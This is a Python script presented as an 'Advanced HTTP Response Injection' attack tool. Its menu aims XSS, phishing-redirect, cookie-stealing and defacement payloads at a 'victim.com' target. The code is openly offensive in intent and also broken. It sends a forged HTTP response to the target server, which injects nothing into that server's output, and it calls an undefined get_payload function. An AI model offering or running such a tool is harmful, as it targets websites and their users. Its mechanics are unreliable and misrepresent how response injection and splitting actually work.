import os
import time
import random
import socket
import sys
import logging


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    clear_screen()
    print("""
    *****************************************
    *     Advanced HTTP Response Injection *
    *        Developed by SPYDIRBYTE        *
    *****************************************

    """)

    print("Welcome to the Advanced HTTP Response Injection Tool")
    print("\nLet’s explore HTTP responses and create malicious payloads!")
    print("\n")


def get_html_payload():
    print("[1] Upload HTML file")
    print("[2] Paste custom HTML code")

    choice = input("\nSelect how you want to provide the HTML payload (1 or 2): ")

    if choice == "1":
       
        file_path = input("[*] Enter the path to your HTML file: ")
        try:
            with open(file_path, "r") as file:
                html_content = file.read()
                print(f"[*] HTML file loaded successfully from {file_path}")
                return html_content
        except Exception as e:
            print(f"[!] Error reading file: {e}")
            return None

    elif choice == "2":
      
        print("[*] Paste your custom HTML code (press Enter twice to finish):")
        html_content = ""
        while True:
            line = input()
            if line == "":
                break
            html_content += line + "\n"
        print("[*] Custom HTML code successfully loaded.")
        return html_content

    else:
        print("[!] Invalid choice!")
        return None


def inject_http_response(target, payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        
    
        http_request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
        s.sendall(http_request.encode())
        
    
        response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{payload}"
        
     
        s.sendall(response.encode())
        s.close()
        
        print(f"[+] Injected HTTP response to {target} with custom HTML payload.")
        log_injection(target, payload, "body")
    except Exception as e:
        print(f"[!] Error injecting response to {target}: {str(e)}")


def log_injection(target, payload, injection_type):
    logging.basicConfig(filename='http_injection_log.txt', level=logging.INFO)
    logging.info(f"{injection_type} injection to {target} with payload: {payload}")
    print(f"[+] Logged injection of type '{injection_type}' to {target}.")


def display_injection_menu():
    print("\nSelect Injection Type:")
    print("[1] HTTP Response Injection (Body - Custom HTML/XSS/Redirect/Defacement)")
    print("[2] HTTP Response Injection (Headers - Custom Header)")
    print("[3] HTTP Response Splitting (Advanced)")
    print("[4] Exit")

    try:
        choice = int(input("\nEnter choice: "))
    except ValueError:
        print("[!] Invalid input! Please enter a number between 1 and 4.")
        return

    if choice == 1:
        print("\nAvailable Payloads:")
        print("[1] XSS Payload (Malicious JavaScript)")
        print("[2] Redirect Payload (Phishing Redirect)")
        print("[3] Cookie Stealing Payload (JavaScript)")
        print("[4] Defacement Payload (Hacked by Anonymous)")
        print("[5] Custom HTML Defacement (Upload/Enter HTML)")

        payload_choice = int(input("\nSelect Payload Type: "))
        target = input("[*] Enter target website (e.g., victim.com): ")
        
        if payload_choice == 1:
            payload = get_payload("xss")
        elif payload_choice == 2:
            payload = get_payload("redirect")
        elif payload_choice == 3:
            payload = get_payload("cookie_steal")
        elif payload_choice == 4:
            print("[*] Defacement Payload Selected: Hacked by Anonymous")
            payload = get_payload("defacement")
        elif payload_choice == 5:
            payload = get_html_payload() 
        else:
            print("[!] Invalid choice.")
            return
        
        if payload: 
            inject_http_response(target, payload)
        
    elif choice == 2:
        payload = input("[*] Enter the custom header payload (e.g., Malicious Header Value): ")
        target = input("[*] Enter target website (e.g., victim.com): ")
        inject_http_headers(target, payload)
        
    elif choice == 3:
        target = input("[*] Enter target website (e.g., victim.com): ")
        http_response_splitting(target)
        
    elif choice == 4:
        print("[*] Exiting the tool. Goodbye!")
        sys.exit()
    else:
        print("[!] Invalid choice! Please select 1, 2, 3, or 4.")


def inject_http_headers(target, payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        
       
        http_request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
        s.sendall(http_request.encode())
        
       
        malicious_headers = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nX-Custom-Header: {payload}\r\n\r\n<html><body><h1>Injected Header</h1><p>{payload}</p></body></html>"
        
        s.sendall(malicious_headers.encode())
        s.close()
        
        print(f"[+] Injected malicious headers to {target} with payload: {payload}")
        log_injection(target, payload, "header")
    except Exception as e:
        print(f"[!] Error injecting headers to {target}: {str(e)}")


def http_response_splitting(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        
      
        http_request = f"GET / HTTP/1.1\r\nHost: {target}\r\nX-Injected-Header: {random.choice(['foo', 'bar', 'baz'])}\r\n\r\n"
        s.sendall(http_request.encode())
        
      
        response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>Injected Split Response</h1><p>Response has been split!</p></body></html>"
        
        s.sendall(response.encode())
        s.close()
        
        print(f"[+] HTTP Response Splitting injected to {target}")
        log_injection(target, "Response Splitting", "splitting")
    except Exception as e:
        print(f"[!] Error in HTTP Response Splitting to {target}: {str(e)}")


def attack_flow():
    while True:
        print_header()
        display_injection_menu()
        time.sleep(1)


if __name__ == "__main__":
    attack_flow()
